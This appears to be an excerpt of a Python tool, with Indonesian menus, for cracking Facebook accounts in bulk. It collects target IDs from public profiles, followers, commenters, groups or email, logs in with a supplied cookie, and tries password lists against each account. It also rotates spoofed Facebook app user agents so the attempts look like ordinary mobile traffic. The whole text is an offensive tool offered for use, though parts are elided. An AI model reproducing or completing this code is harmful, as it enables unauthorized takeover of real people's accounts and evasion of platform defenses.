...
def random_ua():
	...
	___andre___risky___ripai___ = {
	    "1": f"Mozilla/5.0 (Linux; Android 8.1.0; CPH1853 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111;]",
	    
	    "2": f"Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]",
	    
	    "3": f"Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36[FBAN/EMA;FBLC/hi_IN;FBAV/224.0.0.9.117;]",
	    
	    "4": f"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaN8-00/111.030.0609; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.4.2.6 Mobile Safari/533.4 3gpp-gba",
	    
	    "5": f"Mozilla/5.0 (Linux; Android 7.1.1; OPPO A73 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/km_KH;FBAV/325.0.1.4.108;]",
	    "6": f"Mozilla/5.0 (Linux; Android 9; BUZZ 2 Lite Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/326.0.0.13.97;]"
	}
...
def login():
	...
	if cookie in ['get','Get','GET']:
		data = parser(ses.get("https://www.facebook.com/photo.php?fbid=10230028216555416&set=a.1576718583821&type=3&app=fbl").content, "html.parser")
...
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'\n')
	print(f" [{hh}01{P}] 𝐂𝐫𝐚𝐜𝐤 𝐏𝐮𝐛𝐥𝐢𝐜𝐤     [{hh}07{P}] crack search")
	print(f" [{hh}02{P}] 𝐂𝐫𝐚𝐜𝐤 𝐌𝐚𝐬𝐬𝐚𝐥      [{hh}08{P}] crack dari file")
	print(f" [{hh}03{P}] 𝐂𝐫𝐚𝐜𝐤 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫     [{hh}09{P}] cek hasil akun")
	print(f" [{hh}04{P}] 𝐂𝐫𝐚𝐜𝐤 𝐊𝐨𝐦𝐞𝐧      [{hh}10{P}] cek akun kenon")
	print(f" [{hh}05{P}] 𝐂𝐫𝐚𝐜𝐣 𝐆𝐫𝐨𝐮𝐩      [{hh}11{P}] cek opsi akun")
	print(f" [{hh}06{P}] 𝐂𝐫𝐚𝐜𝐤 𝐄𝐦𝐚𝐢𝐥      [{hh}12{P}] keluar ({M}cookie{P})")
	ask = input(f' [{hh}>>{P}] 𝐌𝐞𝐧𝐮 : ')
	print(' ─────────────────────────────')
...
def crack_masal(t,c):
    print(f' [{hh}!{P}] 𝐏𝐚𝐬𝐭𝐢𝐤𝐚𝐧 𝐓𝐚𝐫𝐠𝐞𝐭 𝐁𝐞𝐫𝐬𝐢𝐟𝐚𝐭 𝐏𝐮𝐛𝐥𝐢𝐜𝐤 ')
    try:
        bz=0
        apa = int(input(f' [{hh}?{P}] 𝐌𝐚𝐮 𝐁𝐞𝐫𝐚𝐩𝐚 𝐓𝐚𝐫𝐠𝐞𝐭 : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r [{hh}!{P}] 𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐈𝐝𝐳 𝐘𝐚𝐧𝐠 𝐊𝐞{bz} : ')
    	try:
...
def atur_atur():
	print(f"\r{P} ─────────────────────────────")
	ro = input(f' [{hh}1{P}]. 𝐌𝐨𝐛𝐢𝐥𝐞 [{hh}2{P}]. 𝐌𝐛𝐚𝐬𝐢𝐜 [{hh}3{P}]. 𝐅𝐫𝐞𝐞\n[{hh}?{P}] 𝐌𝐞𝐭𝐨𝐝𝐞 : ')
	...
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}]. 𝐓𝐞𝐫𝐭𝐮𝐚 [{hh}2{P}]. 𝐓𝐞𝐫𝐧𝐞𝐰 [{hh}3{P}]. 𝐀𝐜𝐚𝐤\n[{hh}?{P}] 𝐀𝐤𝐮𝐧 : ')
	if ch in ['1','01']:
		for x in dump:
			id.append(x)
	elif ch in ['2','02']:
		...
		for x in dump:
			id.append(x)
	print(f"{P} ─────────────────────────────")
	cp = input(f' [{hh}!{P}] 𝐓𝐚𝐦𝐩𝐢𝐥𝐤𝐚𝐧 𝐎𝐩𝐬𝐢 𝐒𝐞𝐬𝐢 [𝐘𝐚/𝐧𝐨]]\n[{hh}?{P}] 𝐏𝐢𝐥𝐢𝐡 : ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"{P} ─────────────────────────────")
	apk = input(f' [{hh}!{P}] 𝐓𝐚𝐦𝐩𝐢𝐥𝐤𝐚𝐧 𝐈𝐧𝐟𝐨 𝐀𝐩𝐥𝐢𝐤𝐚𝐬𝐢 [𝐘𝐚/𝐧𝐨]\n[{hh}?{P}] 𝐏𝐢𝐥𝐢𝐡  : ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}]. 𝐌𝐚𝐧𝐮𝐚𝐥 [{hh}2{P}]. 𝐆𝐚𝐛𝐮𝐧𝐠 [{hh}3{P}]. 𝐀𝐮𝐭𝐨\n[{hh}?{P}] 𝐒𝐚𝐧𝐝𝐢  : ')
...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			ua = random.choice(['Mozilla/5.0 (Linux; Android 9; BUZZ 2 Lite Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/293.0.0.9.114;]','Mozilla/5.0 (Linux; Android 8.1.0; itel A14 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/206.0.0.6.119;]',
'Mozilla/5.0 (Linux; Android 8.1.0; BUZZ 1 Lite Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/326.0.0.13.97;]','Mozilla/5.0 (Linux; Android 6.0.1; LG-M151 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/326.0.0.13.97;]',
'Mozilla/5.0 (Linux; Android 8.1.0; Griffe T6 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/272.0.0.6.129;]','Mozilla/5.0 (Linux; Android 11; WP18 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/326.0.0.13.97;]','Mozilla/5.0 (Linux; Android 7.1.1; OPPO A73 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/km_KH;FBAV/325.0.1.4.108;]',
'Mozilla/5.0 (Linux; Android 11; 5033XR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/326.0.0.17.97;]','Mozilla/5.0 (Linux; Android 5.1; PHQ520 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/273.0.0.22.48;]',
'Mozilla/5.0 (Linux; Android 10; TECNO BC1 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/300.0.0.7.111;]','Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5250/S525WXEKE1; U; Bada/1.0; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/2.0 Mobile WQVGA SMM-MMS/1.2.0 NexPlayer/3.0 profile/MIDP-2.1 configuration/CLDC-1.1 OPN-B',
